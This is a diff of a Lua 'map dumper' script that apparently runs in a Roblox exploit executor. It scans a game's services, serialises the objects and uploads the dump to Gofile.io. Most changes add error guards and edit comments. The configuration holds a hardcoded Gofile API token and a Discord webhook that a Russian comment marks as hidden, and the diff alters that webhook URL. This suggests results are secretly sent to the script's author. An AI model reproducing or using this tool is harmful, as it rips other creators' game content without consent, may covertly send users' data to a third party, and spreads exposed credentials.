@@ -12,7 +12,7 @@ local httpRequest = (syn and syn.request) or (http and http.request) or http_req
 -- ================= КОНФИГУРАЦИЯ ================= --
 local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- Gofile Token
 -- ВЕБХУК DISCORD (СКРЫТЫЙ)
-local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufp6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
 -- ================================================ --
 
 local IGNORE_PLAYERS = true 
@@ -62,7 +62,7 @@ local function createLanguageGUI(onSelected)
     if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
     local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
     
-    -- Исправление: Разделение длинных строк создания UI для стабильности
+    -- Разделение длинных строк создания UI для стабильности
     local frame = Instance.new("Frame") 
     frame.Size = UDim2.new(0, 300, 0, 150) 
     frame.Position = UDim2.new(0.5, -150, 0.5, -75) 
@@ -104,7 +104,7 @@ local function createModeGUI(onSelected)
     if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
     local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
     
-    -- Исправление: Разделение длинных строк создания UI для стабильности
+    -- Разделение длинных строк создания UI для стабильности
     local frame = Instance.new("Frame") 
     frame.Size = UDim2.new(0, 300, 0, 150) 
     frame.Position = UDim2.new(0.5, -150, 0.5, -75) 
@@ -146,7 +146,7 @@ end
 local function createMainGUI()
     ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "MapDumperUI" ScreenGui.Parent = CoreGui ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
-    -- Исправление: Разделение длинных строк создания UI для стабильности
+    -- Разделение длинных строк создания UI для стабильности
     MainFrame = Instance.new("Frame") 
     MainFrame.Size = UDim2.new(0, 280, 0, 170) 
     MainFrame.Position = UDim2.new(1, -295, 0, 15) 
@@ -172,7 +172,7 @@ local function createMainGUI()
 end
 
 local function updateStatus(status, progressPercent, color)
-    if not ScreenGui then return end
+    if not ScreenGui or not InfoLabel then return end
     InfoLabel.Text = status
     if progressPercent then Fill.Size = UDim2.new(math.clamp(progressPercent/100, 0, 1), 0, 1, 0) else Fill.Size = UDim2.new(0, 0, 1, 0)  end
     if color then Fill.BackgroundColor3 = color end
@@ -381,7 +381,6 @@ if mapRoot.Props and mapRoot.Props.Name == "GAME_ROOT" then
             end
             
             -- Restoration: If it's a model, restore directly, otherwise use a folder
-            -- Этот блок кода остается неизменным, так как он был синтаксически верным.
             if serviceName == "Workspace" then
                 for _, child in pairs(serviceNode.Children) do build(child, service) end
             else
@@ -430,6 +429,7 @@ local function getProps(obj)
     props.Name = obj.Name
     props.ClassName = obj.ClassName
     
+    -- Защищенный вызов, чтобы пропустить объект, если он невалиден (например, уже удален)
     pcall(function()
         if DUMP_MODE == "General" or DUMP_MODE == "Full" then
             -- General properties
@@ -508,12 +508,16 @@ end
 local scannedCount = 0
 local totalToScan = 0
 
+-- Усиленный countDescendants с защитой pcall
 local function countDescendants(obj)
     local c = 0
     local s, children = pcall(function() return obj:GetChildren() end)
     if not s or not children then return 0 end
     
     for _, v in ipairs(children) do
+        -- Добавлена дополнительная проверка, что объект все еще существует, прежде чем получить его свойства
+        if not v or not v.Parent then continue end 
+        
         if IGNORE_PLAYERS and v:IsA("Model") and game.Players:GetPlayerFromCharacter(v) then continue end
         if v:IsA("Terrain") and v.Parent == Workspace then continue end
         -- Skip services that are children of other services by default
@@ -524,6 +528,7 @@ local function countDescendants(obj)
     return c
 end
 
+-- Усиленный scan с защитой pcall
 local function scan(obj)
     scannedCount = scannedCount + 1
     
@@ -535,14 +540,25 @@ local function scan(obj)
     local node = { Props = getProps(obj), Children = {} }
     
     local s, children = pcall(function() return obj:GetChildren() end)
+    -- Строка 543: Проверка успешности pcall для GetChildren
     if s and children then
         for _, child in ipairs(children) do
+            -- Строка 545: Добавлена дополнительная проверка на существование объекта
+            if not child or not child.Parent then continue end 
+            
             if IGNORE_PLAYERS and child:IsA("Model") and game.Players:GetPlayerFromCharacter(child) then continue end
             if child:IsA("Terrain") and child.Parent == Workspace then continue end
             if child.Name == "Camera" and child.Parent == Workspace then continue end
             if child.Parent and child.Parent ~= game and game:GetService(child.Name) then continue end
             
-            table.insert(node.Children, scan(child))
+            -- Вызов scan также теперь защищен:
+            local success, childNode = pcall(scan, child)
+            if success and childNode then
+                table.insert(node.Children, childNode)
+            else
+                -- Если сканирование дочернего элемента завершилось ошибкой, логируем ее и продолжаем
+                warn("Failed to scan child:", child.Name, child.ClassName, child.Parent and child.Parent.Name, childNode)
+            end
         end
     end
     return node
@@ -581,13 +597,14 @@ local function uploadToGofile(files)
         local servers = {"https://store1.gofile.io/uploadFile", "https://api.gofile.io/uploadFile"}
         local response
         
-        local animateTask
-        local p = 0
-        animateTask = task.spawn(function()
-            while not response do
+        local isUploading = true
+        local animateTask = task.spawn(function()
+            local p = 0
+            while isUploading do
                 p = (p + 10) % 100
                 updateStatus(status, p, Color3.fromRGB(255, 170, 0))
-                task.wait(0.05)
+                -- Используем task.wait вместо task.delay, так как task.wait более предсказуем в циклах
+                task.wait(0.05) 
             end
             updateStatus(status, 100, Color3.fromRGB(0, 120, 255))
         end)
@@ -598,7 +615,8 @@ local function uploadToGofile(files)
             end
         end
         
-        task.cancel(animateTask)
+        isUploading = false -- Строка 660: Устанавливаем флаг остановки вместо task.cancel, чтобы избежать потенциальной гонки
+        task.wait(0.1) -- Даем циклу анимации завершить последнюю итерацию
         
         if not response or not response.Body then return false, "No Response (HTTP)" end
         
@@ -654,13 +672,16 @@ local function startDumper()
         
         -- CREATE A VIRTUAL ROOT FOR MULTI-SERVICE DUMP
         local gameRoot = { Props = {Name = "GAME_ROOT", ClassName = "Folder"}, Children = {} } 
-        -- Предыдущая строка 443 была синтаксически верна, но могла быть затронута ошибкой парсера из-за UI-кода выше.
         
         for _, root in ipairs(rootsToScan) do
-            local serviceNode = scan(root)
-            -- Override name to ensure it matches service name
-            serviceNode.Props.Name = root.Name 
-            table.insert(gameRoot.Children, serviceNode)
+            local success, serviceNode = pcall(scan, root)
+            if success and serviceNode then
+                -- Override name to ensure it matches service name
+                serviceNode.Props.Name = root.Name 
+                table.insert(gameRoot.Children, serviceNode)
+            else
+                 warn("Failed to scan service:", root.Name, serviceNode)
+            end
         end
         
         local mapData = {
@@ -708,5 +729,5 @@ end
 
 
 createLanguageGUI(function()
-    createModeGUI(startDumper) -- Предыдущая строка 559 теперь здесь, и она должна быть стабильной
+    createModeGUI(startDumper) 
 end)
